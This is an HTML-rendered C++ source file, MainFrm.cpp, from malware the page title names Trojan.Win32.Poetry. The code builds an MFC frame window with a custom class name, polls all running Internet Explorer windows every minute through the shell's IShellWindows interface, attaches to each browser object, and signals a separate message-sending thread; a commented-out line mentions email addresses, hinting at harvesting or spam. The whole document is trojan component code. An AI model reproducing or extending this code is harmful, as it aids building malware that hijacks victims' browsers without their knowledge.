<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Trojan.Win32.Poetry - MainFrm.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include "stdafx.h"
#include "PoetryApp.h"
#include "mainfrm.h"
#include "webbrowse.h"
</span><span class="sc0">
</span><span class="sc11">IMPLEMENT_DYNAMIC</span><span class="sc10">(</span><span class="sc11">CMainFrame</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CFrameWnd</span><span class="sc10">)</span><span class="sc0">

</span><span class="sc11">BEGIN_MESSAGE_MAP</span><span class="sc10">(</span><span class="sc11">CMainFrame</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CFrameWnd</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc2">//{{AFX_MSG_MAP(CMainFrame)
</span><span class="sc0">    </span><span class="sc11">ON_WM_CREATE</span><span class="sc10">()</span><span class="sc0">
    </span><span class="sc11">ON_WM_TIMER</span><span class="sc10">()</span><span class="sc0">
    </span><span class="sc11">ON_WM_ACTIVATEAPP</span><span class="sc10">()</span><span class="sc0"> 
    </span><span class="sc2">//}}AFX_MSG_MAP
</span><span class="sc11">END_MESSAGE_MAP</span><span class="sc10">()</span><span class="sc0">


</span><span class="sc2">////////////////////////////////////////////////////////////////
//
//
</span><span class="sc11">CMainFrame</span><span class="sc10">::</span><span class="sc11">CMainFrame</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">   
    </span><span class="sc11">CoInitialize</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">m_TimerHandle</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m_ShellDisp</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m_ShellWindows</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">


    

</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">////////////////////////////////////////////////////////////////
//
//
</span><span class="sc11">CMainFrame</span><span class="sc10">::~</span><span class="sc11">CMainFrame</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//Remove m_IEs
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_IEs</span><span class="sc10">.</span><span class="sc11">GetSize</span><span class="sc10">();</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CWebBrowser2</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">WebBrowser</span><span class="sc10">=(</span><span class="sc11">CWebBrowser2</span><span class="sc10">*)</span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_IEs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc2">//WebBrowser-&gt;Reset();
</span><span class="sc0">        </span><span class="sc5">delete</span><span class="sc0"> </span><span class="sc11">WebBrowser</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_IEs</span><span class="sc10">.</span><span class="sc11">RemoveAll</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc11">CoUninitialize</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">////////////////////////////////////////////////////////////////
//
//
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CMainFrame</span><span class="sc10">::</span><span class="sc11">PreCreateWindow</span><span class="sc10">(</span><span class="sc11">CREATESTRUCT</span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0"> 
    </span><span class="sc2">// Use the specific class name we established earlier
</span><span class="sc0">    </span><span class="sc11">cs</span><span class="sc10">.</span><span class="sc11">lpszClass</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_T</span><span class="sc10">(</span><span class="sc6">"PoetryIsDeadClass"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">CFrameWnd</span><span class="sc10">::</span><span class="sc11">PreCreateWindow</span><span class="sc10">(</span><span class="sc11">cs</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> 


</span><span class="sc2">////////////////////////////////////////////////////////////////
//
//
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">CMainFrame</span><span class="sc10">::</span><span class="sc11">OnCreate</span><span class="sc10">(</span><span class="sc11">LPCREATESTRUCT</span><span class="sc0"> </span><span class="sc11">lpCreateStruct</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CFrameWnd</span><span class="sc10">::</span><span class="sc11">OnCreate</span><span class="sc10">(</span><span class="sc11">lpCreateStruct</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">//Get The shell interface   
</span><span class="sc0">    </span><span class="sc11">HRESULT</span><span class="sc0"> </span><span class="sc11">sc</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">HRESULT</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">::</span><span class="sc11">CoCreateInstance</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">CLSID_Shell</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CLSCTX_SERVER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IID_IDispatch</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">**)&amp;</span><span class="sc11">m_ShellDisp</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//&lt;== Create an instance of the shell 
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FAILED</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">))</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc11">str</span><span class="sc10">.</span><span class="sc11">Format</span><span class="sc10">(</span><span class="sc11">_T</span><span class="sc10">(</span><span class="sc6">"Failed to create Shell "</span><span class="sc10">));</span><span class="sc0"> 
        </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> 
    </span><span class="sc11">IDispatch</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">m_ShellWindowsDisp</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">    
    </span><span class="sc11">res</span><span class="sc10">=</span><span class="sc11">m_ShellDisp</span><span class="sc10">-&gt;</span><span class="sc11">Windows</span><span class="sc10">(&amp;</span><span class="sc11">m_ShellWindowsDisp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">res</span><span class="sc10">=</span><span class="sc11">m_ShellWindowsDisp</span><span class="sc10">-&gt;</span><span class="sc11">QueryInterface</span><span class="sc10">(</span><span class="sc11">IID_IShellWindows</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc10">**)&amp;</span><span class="sc11">m_ShellWindows</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">//Set the timer
</span><span class="sc0">    </span><span class="sc11">m_TimerHandle</span><span class="sc10">=</span><span class="sc11">SetTimer</span><span class="sc10">(</span><span class="sc11">ID_CHECKTIMER</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">*</span><span class="sc4">60</span><span class="sc10">*</span><span class="sc4">1000</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//set to 1 minute (1*60*1000)
</span><span class="sc0">    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">////////////////////////////////////////////////////////////////
//
//
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CMainFrame</span><span class="sc10">::</span><span class="sc11">OnTimer</span><span class="sc10">(</span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">nIDEvent</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">   
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">nIDEvent</span><span class="sc10">==</span><span class="sc11">ID_CHECKTIMER</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">       
        </span><span class="sc2">//Get all the running instances of IE       
</span><span class="sc0">        </span><span class="sc11">GetIEWindows</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CMainFrame</span><span class="sc10">::</span><span class="sc11">GetIEWindows</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">wincount</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m_ShellWindows</span><span class="sc10">-&gt;</span><span class="sc11">get_Count</span><span class="sc10">(&amp;</span><span class="sc11">wincount</span><span class="sc10">);</span><span class="sc0">

    
  </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">wincount</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0"> 
    </span><span class="sc11">VARIANT</span><span class="sc0"> </span><span class="sc11">va</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">va</span><span class="sc10">.</span><span class="sc11">vt</span><span class="sc10">=</span><span class="sc11">VT_I4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">va</span><span class="sc10">.</span><span class="sc11">intVal</span><span class="sc10">=</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">IDispatch</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FolderDisp</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">IWebBrowser2</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">WebBrowser2</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">HRESULT</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc10">=</span><span class="sc11">m_ShellWindows</span><span class="sc10">-&gt;</span><span class="sc11">Item</span><span class="sc10">(</span><span class="sc11">va</span><span class="sc10">,&amp;</span><span class="sc11">FolderDisp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">res</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">   
        </span><span class="sc11">res</span><span class="sc10">=</span><span class="sc11">FolderDisp</span><span class="sc10">-&gt;</span><span class="sc11">QueryInterface</span><span class="sc10">(</span><span class="sc11">IID_IWebBrowser2</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc10">**)&amp;</span><span class="sc11">WebBrowser2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">res</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">AddWebBrowser</span><span class="sc10">(</span><span class="sc11">WebBrowser2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">//theApp.m_SendMessageThread-&gt;PostThreadMessage(WUM_EMAILADDED,0,0);        
</span><span class="sc0">    </span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_SendMessageThread</span><span class="sc10">-&gt;</span><span class="sc11">PostThreadMessage</span><span class="sc10">(</span><span class="sc11">WM_PARENTNOTIFY</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">CMainFrame</span><span class="sc10">::</span><span class="sc11">AddWebBrowser</span><span class="sc10">(</span><span class="sc11">IWebBrowser2</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">WebBrowser2</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc2">//Is it allready in our lists?
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_IEs</span><span class="sc10">.</span><span class="sc11">GetSize</span><span class="sc10">();</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">   
        </span><span class="sc11">IWebBrowser2</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">WB</span><span class="sc10">=((</span><span class="sc11">CWebBrowser2</span><span class="sc10">*)</span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_IEs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])-&gt;</span><span class="sc11">m_pBrowserApp</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">WB</span><span class="sc10">==</span><span class="sc11">WebBrowser2</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_IEs</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc11">WebBrowser2</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">       
    </span><span class="sc10">}</span><span class="sc0">


    </span><span class="sc2">//Create a new CWebBrowser2 object.
</span><span class="sc0">    </span><span class="sc2">//This class holds a IWebBrowser2
</span><span class="sc0">    </span><span class="sc11">CWebBrowser2</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pwebBrowser</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CWebBrowser2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WebBrowser2</span><span class="sc10">-&gt;</span><span class="sc11">AddRef</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">pwebBrowser</span><span class="sc10">-&gt;</span><span class="sc11">Attach</span><span class="sc10">(</span><span class="sc11">WebBrowser2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">//delete pwebBrowser;
</span><span class="sc0">
    </span><span class="sc2">//Add it!
</span><span class="sc0">    </span><span class="sc11">theApp</span><span class="sc10">.</span><span class="sc11">m_IEs</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">pwebBrowser</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
